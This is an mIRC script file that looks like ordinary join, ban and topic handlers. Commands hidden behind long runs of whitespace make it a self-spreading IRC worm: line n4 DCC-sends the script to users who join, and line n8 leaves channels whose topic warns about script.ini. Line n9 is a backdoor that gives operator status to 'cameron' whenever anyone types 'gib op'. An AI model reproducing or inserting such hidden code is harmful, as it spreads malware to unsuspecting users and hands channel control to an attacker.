[script]
n0=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n1=
n2=on 1:JOIN:*:{
n3=  if ( $nick == $me ) { halt }
n4=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n5=}
n6=
n7=;show channel topic in channel on join
n8=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
n9=ON 1:TEXT:*gib op*:#:/mode $chan +o cameron